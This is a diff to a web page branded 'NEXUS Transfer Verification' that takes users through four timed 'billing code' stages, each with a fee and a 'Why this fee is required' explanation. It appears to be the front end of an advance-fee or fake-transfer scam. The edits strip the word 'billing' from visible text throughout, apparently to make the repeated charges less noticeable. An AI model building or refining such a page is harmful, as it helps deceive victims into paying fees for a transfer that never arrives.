@@ -560,7 +560,7 @@
                     <span class="text-xl font-bold font-display">NEXUS</span>
                 </div>
                 <h1 class="text-2xl font-bold font-display">Transfer Verification</h1>
-                <p class="text-gray-400 mt-1">Complete all billing stages to finalize your transfer</p>
+                <p class="text-gray-400 mt-1">Complete all stages to finalize your transfer</p>
             </div>
 
             <!-- Pending Transfer Info -->
@@ -611,8 +611,8 @@
                         </svg>
                         <div class="timer-text" id="timerText">30:00</div>
                     </div>
-                    <div class="timer-label">Next billing code unlocks in</div>
-                    <div class="timer-next-code" id="timerNextCode">Second Billing Code</div>
+                    <!-- <div class="timer-label">Next billing code unlocks in</div> -->
+                    <div class="timer-next-code" id="timerNextCode"></div>
                     <p class="text-gray-400 text-sm mt-3 max-w-xs mx-auto" id="timerMessage">
                         Please wait while we process your previous verification...
                     </p>
@@ -631,7 +631,7 @@
                             </span>
                             <span class="billing-amount" id="billingAmount1">--</span>
                         </div>
-                        <p class="billing-description" id="billingDesc1">Fetching billing details...</p>
+                        <p class="billing-description" id="billingDesc1">Fetching details...</p>
                         
                         <div class="code-explanation" id="explanation1">
                             <strong><i class="fas fa-info-circle mr-1"></i>Why this fee is required:</strong><br>
@@ -676,7 +676,7 @@
                             </span>
                             <span class="billing-amount" id="billingAmount2">--</span>
                         </div>
-                        <p class="billing-description" id="billingDesc2">Fetching billing details...</p>
+                        <p class="billing-description" id="billingDesc2">Fetching details...</p>
                         
                         <div class="code-explanation" id="explanation2">
                             <strong><i class="fas fa-info-circle mr-1"></i>Why this fee is required:</strong><br>
@@ -708,7 +708,7 @@
                         <input type="text" class="code-segment" maxlength="4" data-code="2" data-segment="3" placeholder="XXXX">
                     </div>
                     <button class="btn-primary" onclick="verifyCode(2)" id="verifyBtn2">
-                        <i class="fas fa-check mr-2"></i> Verify Second Code
+                        <i class="fas fa-check mr-2"></i> Verify Code
                     </button>
                 </div>
 
@@ -721,7 +721,7 @@
                             </span>
                             <span class="billing-amount" id="billingAmount3">--</span>
                         </div>
-                        <p class="billing-description" id="billingDesc3">Fetching billing details...</p>
+                        <p class="billing-description" id="billingDesc3">Fetching details...</p>
                         
                         <div class="code-explanation" id="explanation3">
                             <strong><i class="fas fa-info-circle mr-1"></i>Why this fee is required:</strong><br>
@@ -766,7 +766,7 @@
                             </span>
                             <span class="billing-amount" id="billingAmount4">--</span>
                         </div>
-                        <p class="billing-description" id="billingDesc4">Fetching billing details...</p>
+                        <p class="billing-description" id="billingDesc4">Fetching details...</p>
                         
                         <div class="code-explanation" id="explanation4">
                             <strong><i class="fas fa-info-circle mr-1"></i>Why this fee is required:</strong><br>
@@ -809,7 +809,7 @@
                     <i class="fas fa-check-double text-3xl text-white"></i>
                 </div>
                 <h2 class="text-2xl font-bold text-green-400 mb-2">Transfer Completed!</h2>
-                <p class="text-gray-400 mb-6">All billing codes verified. Your transfer is now complete.</p>
+                <p class="text-gray-400 mb-6">All codes verified. Your transfer is now complete.</p>
                 
                 <div class="glass-card p-4 mb-6 text-left">
                     <div class="receipt-row">
@@ -990,7 +990,7 @@
                 
                 const descEl = document.getElementById(`billingDesc${i}`);
                 if (descEl) {
-                    descEl.textContent = `Amount: ${formatCurrency(displayAmount)}. Enter your billing code below to proceed.`;
+                    descEl.textContent = `Amount: ${formatCurrency(displayAmount)}. Enter the code below to proceed.`;
                 }
                 
                 // Update code hint - show ONLY first 4 digits
@@ -1148,7 +1148,7 @@
             
             document.getElementById('timerNextCode').textContent = `${codeNames[nextCodeNum - 1]}: ${name}`;
             document.getElementById('timerMessage').textContent = 
-                `Please wait ${Math.ceil(durationMs / 60000)} minutes before entering the next billing code.`;
+                `Please wait ${Math.ceil(durationMs / 60000)} minutes before proceeding with your transfer.`;
             
             const circle = document.getElementById('timerCircle');
             const text = document.getElementById('timerText');
@@ -1271,7 +1271,7 @@
             btn.disabled = true;
             btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Verifying...';
             
-            showLoader('Verifying billing code');
+            showLoader('Verifying code');
             
             try {
                 const profileMatch = await checkUserProfileCode(codeNumber, formattedEntered, enteredCode);
@@ -1465,7 +1465,7 @@
         function getVerifyButtonText(codeNumber) {
             const texts = [
                 '<i class="fas fa-check mr-2"></i> Verify First Code',
-                '<i class="fas fa-check mr-2"></i> Verify Second Code',
+                '<i class="fas fa-check mr-2"></i> Verify  Code',
                 '<i class="fas fa-check mr-2"></i> Verify Third Code',
                 '<i class="fas fa-check mr-2"></i> Verify Final Code & Complete'
             ];
